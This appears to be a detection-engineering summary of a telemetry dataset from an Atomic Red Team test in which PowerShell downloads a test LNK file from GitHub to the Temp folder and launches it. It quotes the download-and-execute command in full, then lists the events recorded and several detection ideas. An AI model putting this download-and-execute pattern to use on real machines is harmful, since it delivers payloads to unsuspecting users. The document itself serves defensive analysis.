# T1204.002-10: Malicious File — LNK Payload Download

## Technique Context

T1204.002 (Malicious File) represents user execution of malicious files, a fundamental initial access and execution technique where attackers rely on social engineering to trick users into opening harmful content. This specific test focuses on LNK files — Windows shortcuts that can execute arbitrary commands when double-clicked. Attackers commonly distribute malicious LNK files via email attachments, USB drops, or file shares, leveraging users' familiarity with shortcut files to bypass suspicion. The detection community emphasizes monitoring LNK file creation, unusual command execution from shortcuts, and network activity triggered by LNK execution. This technique often serves as a delivery mechanism for follow-on activities like payload downloads, credential theft, or establishing persistence.

## What This Dataset Contains

This dataset captures a PowerShell-driven test that downloads and attempts to execute a malicious LNK file. The core execution flow is visible across multiple data sources:

**PowerShell Activity (EID 4104/4103):** Shows the complete attack script: `Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"` followed by `Start-Process $file1`. Critically, PowerShell EID 4100 shows the execution failed: `"This command cannot be run due to the error: No application is associated with the specified file for this operation."`

**Network Evidence (Sysmon EID 22/3):** DNS resolution for `raw.githubusercontent.com` and HTTPS connection to `185.199.109.133:443` from the PowerShell process, demonstrating the download phase.

**File Creation (Sysmon EID 11):** Documents the LNK file being written to `C:\Windows\Temp\test10.lnk` by the PowerShell process, proving successful download.

**Process Chain (Security EID 4688, Sysmon EID 1):** Shows powershell.exe (PID 10580) spawning a child powershell.exe (PID 12516) with the full attack command line, then attempting to execute taskkill.exe to clean up a process named "a.exe" (presumably the intended LNK payload).

## What This Dataset Does Not Contain

The dataset demonstrates a failed attack attempt — the LNK file was successfully downloaded but failed to execute. This failure means the dataset lacks:

**LNK Execution Events:** No process creation from the LNK file itself, as Windows couldn't associate the file type with an application. This suggests the test environment may lack a proper LNK handler or the downloaded file was corrupted.

**Payload Activity:** The test expects an "a.exe" process to run (evidenced by the `taskkill /IM a.exe /F` command), but no such process appears in the telemetry, confirming the LNK execution failure.

**User Interaction Simulation:** The test uses `Start-Process` rather than simulating actual user double-click behavior, which would generate different event patterns.

## Assessment

This dataset provides moderate value for detection engineering despite the failed execution. The successful download phase generates excellent network and file creation telemetry that's representative of real attacks. The PowerShell script block logging captures the complete attack methodology with full command lines. However, the lack of successful LNK execution limits its utility for developing detections around the actual malicious file execution phase. The dataset is most valuable for detecting the reconnaissance and staging phases of LNK-based attacks rather than the execution phase itself.

## Detection Opportunities Present in This Data

1. **Suspicious PowerShell Downloads to Temp Directory** — Monitor PowerShell EID 4103 for `Invoke-WebRequest` with `-OutFile` parameters targeting temporary directories, especially for executable file extensions

2. **GitHub Raw Content Downloads** — Alert on DNS queries (Sysmon EID 22) and network connections (Sysmon EID 3) to `raw.githubusercontent.com`, particularly from scripting engines

3. **LNK File Creation in Temp Locations** — Monitor Sysmon EID 11 for `.lnk` file creation in user/system temp directories by non-standard processes like PowerShell

4. **PowerShell Script Block Execution Patterns** — Detect PowerShell EID 4104 script blocks containing download-and-execute patterns with file type extensions commonly used in attacks

5. **Process Access Patterns from PowerShell** — Monitor Sysmon EID 10 for PowerShell processes accessing newly created child processes with full access rights (0x1FFFFF), indicating potential process management

6. **Failed File Association Errors** — Track PowerShell EID 4100 errors mentioning file association problems, which may indicate malformed or blocked malicious files

7. **Defensive Taskkill Execution** — Monitor Security EID 4688 for taskkill.exe execution from PowerShell processes, potentially indicating cleanup attempts after failed attacks
